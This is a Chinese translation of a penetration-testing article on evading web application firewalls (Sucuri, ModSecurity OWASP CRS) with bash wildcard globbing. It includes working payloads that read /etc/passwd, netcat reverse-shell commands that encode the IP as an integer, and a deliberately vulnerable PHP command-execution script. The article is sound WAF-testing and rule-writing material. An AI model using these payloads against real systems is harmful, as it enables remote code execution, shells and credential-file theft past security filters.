> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/2699#toc-9)

[原文链接](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)

前言
--

我可以用

```
/???/??t /???/??ss??
```

读取你的 passwd 文件。享受`Sucuri WAF`，`ModSecurity`，`Paranoia`等等 waf 带来的的乐趣......

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204218-f5e0f054-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204218-f5e0f054-b03f-1.png)

ps：mac 上好像不太行，按道理应该也可以啊。

在 Web 应用程序中发现远程命令执行漏洞并不是很少见，并且`OWASP Top 10-2017`将`sql inject`置于第一个位置：

当不受信任的数据作为命令或查询的一部分发送到解释器时，就会发生注入，例如`SQL`，`NoSQL`，`OS`和`LDAP`注入。攻击者的恶意数据可以欺骗解释器在没有适当授权的情况下执行非预期的命令或访问数据。

所有现代 Web 应用程序防火墙都能够拦截（甚至阻止）RCE 尝试，但是当它发生在 Linux 系统中时，我们有很多方法可以逃避 WAF 规则集。渗透测试人员最好的朋友不是狗...... 它的名字是`通配符`。在开始做 WAPT 之前，我想告诉你一些你可能不了解 bash 和通配符的事情。

关于通配符你不知道的事
-----------

各种命令行实用程序使用 Bash 标准通配符（也称为通配模式）来处理多个文件。有关标准通配符的更多信息，请通过键入参考手册页`man 7 glob`。不是每个人都知道有很多 bash 语法使你能够使用问号`？`，正斜杠`/`，`数字和字母`来执行系统命令。您甚至可以使用相同数量的字符枚举文件并获取其内容。怎么样？我举几个例子：  
执行 ls 命令，您可以使用以下语法：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f5fe3786-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f5fe3786-b03f-1.png)

使用这种语法，您可以执行基本上所需的一切。比方说，你的脆弱的目标是一个 Web 应用防火墙的后面，这 WAF 有一个规则，包含块的所有请求`/etc/passwd`或`/bin/ls` GET 参数的值内或身体内部的 POST 请求。如果你试图提出一个请求，`/?cmd=cat+/etc/passwd`它会被目标 WAF 阻止，你的 IP 将被永久禁止并被标记为`另一个f *** in'redteamer'`。但是你的口袋里有一个叫做通配符的秘密武器。如果你很幸运（不太幸运，我们后面会说到），目标 WAF 没有足够的严格，来阻止像`?`和`/`在查询字符串中。因此，您可以轻松地发出您的请求（网址编码），如下所示：`/?cmd=%2f???%2f??t%20%2f???%2fp??s??`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f62ad99e-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f62ad99e-b03f-1.png)

正如您在上面的屏幕截图中看到的那样，有 3 个错误`/bin/cat *：是一个目录`。发生这种情况是因为`/???/??t`可以通过整合过程`转换`到`/bin/cat`或者`/dev/net`,`/etc/apt` 等等....

问号通配符仅代表一个可以是任何字符的字符。因此，如果您知道文件名的一部分而不是一个字母，那么您可以使用此通配符。例如`ls *.???`，列出当前目录中扩展名为 3 个字符的所有文件。因此，将列出具有`.gif，.jpg，.txt`等扩展名的文件。

使用此通配符，您可以使用 netcat 执行反向 shell。假设您需要在端口 1337（通常`nc -e /bin/bash 127.0.0.1 1337`）执行反向 shell 到 127.0.0.1 ，您可以使用以下语法执行此操作：  
`/???/n? -e /???/b??h 2130706433 1337`

以`long`格式（2130706433）转换 IP 地址`127.0.0.1`，可以避免在 HTTP 请求中使用`.`字符。

在我的 kali 中我需要使用`nc.traditional`而不是 nc 没有 - e 参数，以便 / bin/bash 在连接后执行。payload 变成这样：

```
/???/?c.??????????? -e /???/b??h 2130706433 1337
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f6390a64-b03f-1.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f6390a64-b03f-1.gif)

下面我们刚刚看到的两个命令的一些摘要：

```
标准：/bin/nc 127.0.0.1 1337 
bypass：/???/n? 2130706433 1337 
使用的字符：/ ? n [0-9]

标准：/bin/cat /etc/passwd
bypass：/???/??t /???/??ss??
使用的字符：/ ? t s

为什么用?而不是*,因为星号（*）被广泛用于注释语法（类似/*嘿，我是注释*/），许多WAF阻止它以避免SQL注入...类似于UNION + SELECT + 1,2,3 /*
```

使用 echo？枚举文件和目录？是的你可以。该 echo 命令可以使用通配符枚举文件系统上的文件和目录。例如`echo /*/*ss*`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f648a550-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f648a550-b03f-1.png)

这可以在 RCE 上使用，以便在目标系统上获取文件和目录，例如：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f678e76a-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204219-f678e76a-b03f-1.png)

但是为什么使用通配符（特别是问号）可以逃避 WAF 规则集？让我先从 Sucuri WAF 开始吧！

Sucuri WAF bypass
-----------------

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204220-f6b18a98-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204220-f6b18a98-b03f-1.png)

哪种测试 WAF 规则集的最佳方法是什么？创建世界上最易受攻击的 PHP 脚本并尝试所有可能的技术！在上面的屏幕截图中，我们有：在左上方的窗格中有我丑陋的 Web 应用程序（它只是一个执行命令的 PHP 脚本）：

```
<?php
      echo 'ok: ';
      print_r($_GET['c']);
      system($_GET['c']);
```

在左下方的窗格中，您可以在我的网站上看到由 Sucuri WAF（test1.unicresit.it）保护的远程命令执行测试。正如您所看到的，Sucuri 阻止了我的请求，原因是`检测到并阻止了尝试的RFI/LFI`。这个原因并不完全正确，但好消息是 WAF 阻止了我的攻击（我甚至不知道为什么防火墙会告诉我阻止请求的原因，但应该有一个理由......）。

右侧窗格是最有趣的，因为它显示相同的请求，但使用`问号`作为通配符。结果令人恐惧...... Sucuri WAF 接受了请求，我的应用程序执行了我输入 c 参数的命令。现在我可以读取`/etc/passwd`文件甚至更多... 我可以阅读应用程序本身的 PHP 源代码，我可以使用`netcat`（或者我喜欢称之为`/???/?c`）来执行反向 shell ，或者我可以执行类似`curl或wget`按顺序的程序显示 Web 服务器的真实 IP 地址，使我能够通过直接连接到目标来绕过 WAF。

我不知道是否会发生这种情况，因为我在`Sucuri WAF`配置上遗漏了一些内容，但似乎没有... 我已经在 Sucuri 问过这是否是一种有人参与的行为，以及他们是否配置了默认的`低等级`以避免错误，但我还在等待答案。

请记住，我正在使用一个不代表真实场景的愚蠢 PHP 脚本进行此测试。恕我直言，你不应该根据它阻止的请求来判断一个 WAF，而且 Sucuri 的安全性并不高，因为它不能完全保护一个故意易受攻击的网站。做了必要的说明！

ModSecurity OWASP CRS 3.0
-------------------------

我真的很喜欢 ModSecurity，我认为与 Nginx 和 Nginx 连接器一起使用的新 libmodsecurity（v3）是我用过的最佳解决方案，用于部署 Web 应用程序防火墙。我也是 OWASP 核心规则集的忠实粉丝！我到处都用它但是，如果你不太了解这个规则集，你需要注意一个叫做爱的小东西.. 嗯对不起妄想症又犯了！

严格模式
----

您可以在[此处](https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/e4e0497be4d598cce0e0a8fef20d1f1e5578c8d0/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf)找到的以下`模式` 很好地概述了每个级别如何处理 “请求协议强制执行” 规则。正如您在 PL1 中看到的那样，查询字符串只能包含 1-255 范围内的 ASCII 字符，并且它会变得更加严格，直到 PL4 阻止非常小范围内的非 ASCII 字符

```
# -=[ Targets and ASCII Ranges ]=-
#
# 920270: PL1
# REQUEST_URI, REQUEST_HEADERS, ARGS and ARGS_NAMES
# ASCII: 1-255
# Example: Full ASCII range without null character
#
# 920271: PL2
# REQUEST_URI, REQUEST_HEADERS, ARGS and ARGS_NAMES
# ASCII: 9,10,13,32-126,128-255
# Example: Full visible ASCII range, tab, newline
#
# 920272: PL3
# REQUEST_URI, REQUEST_HEADERS, ARGS, ARGS_NAMES, REQUEST_BODY
# ASCII: 32-36,38-126
# Example: Visible lower ASCII range without percent symbol
#
# 920273: PL4
# ARGS, ARGS_NAMES and REQUEST_BODY
# ASCII: 38,44-46,48-58,61,65-90,95,97-122
# Example: A-Z a-z 0-9 = - _ . , : &
#
# 920274: PL4
# REQUEST_HEADERS without User-Agent, Referer, Cookie
# ASCII: 32,34,38,42-59,61,65-90,95,97-122
# Example: A-Z a-z 0-9 = - _ . , : & " * + / SPACE
```

让我们对所有级别进行一些测试！

PL0
---

等级 0 表示禁用了许多规则，因此我们的 payload 可以毫无问题地导致远程命令执行，这是绝对正常的。问题不大，不要慌:)

```
SecAction "id:999,\
phase:1,\
nolog,\
pass,\
t:none,\
setvar:tx.paranoia_level=0"
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204220-f6dbd83e-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204220-f6dbd83e-b03f-1.png)

PL1, PL2
--------

我已将 1 级和 2 级分组，因为它们的差异（如上图所示）不会影响我们的目标，所有行为都与下面描述的相同。

```
SecAction "id:999,\
phase:1,\
nolog,\
pass,\
t:none,\
setvar:tx.paranoia_level=1"
```

使用 PL1（和 PL2）ModSecurity 显然阻止了我对`OS File Access Attempt`的请求（930120）。但是，如果我将问号用作通配符怎么办？该请求被我的 WAF 通过了：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204220-f7083d48-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204220-f7083d48-b03f-1.png)

发生这种情况是因为 “问号”，`正斜杠`和`空格`都在规则 920271 和 920272 的字符范围内。此外，使用`问号`代替命令语法使我能够逃避`拦截操作系统的常见命令和文件`（例如我们的`/etc/passwd`）。

PL3
---

这种模式它阻止包含`？`等字符的请求超过 n 次。事实上，我的请求已被阻止为`元字符异常检测警报 - 重复非字符`。这很酷！很强的 ModSecurity，你赢了一只泰迪熊！但不幸的是，我的网络应用程序是如此丑陋和易受攻击，我可以使用较少的问号并使用以下语法读取 passwd 文件：`c=/?in/cat+/et?/passw?`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180904204221-f73acede-b03f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180904204221-f73acede-b03f-1.png)

正如你所看到的，只使用 3 个`？`问号我就 bypass 了这个级别并读取目标系统内的 passwd 文件。好吧，这并不意味着你必须始终无条件地将你的等级设置为 4。请记住，我正在使用一个非常愚蠢的 PHP 脚本来测试它，这个脚本并不代表真实场景... 我希望...... 你懂的.....

现在每个人都知道 42 是生命，宇宙和一切的答案。但是那样：`你会bypass PL4的OWASP规则集吗？`

PL4
---

基本上没有，我做不到。范围之外的所有字符`a-z A-Z 0–9`都被阻止！没办法...... 相信我，当你需要执行一个命令来读取文件时，有 90％的概率你需要一个`空格`字符或`正斜杠`.

最后的想法
-----

回到静态 HTML 页面...... 这是提高 Web 应用程序安全性的最快方法！很难说 避免`bypass WAF`的最佳配置是什么，或者使用什么 waf 最好。恕我直言，我们不应该信任在 Web 应用程序上均匀分布的规则集。实际上，我认为我们应该根据应用程序功能配置我们的 WAF 规则。

无论如何，当你在 ModSecurity 上写一个新的 SecRule 时，请记住，可能有很多方法可以避开你的`过滤器/正则表达式`。所以写下来`我怎么能逃避这个规则？`。

后续继续把剩下的两篇补上，文中有些可能欠妥，请指出！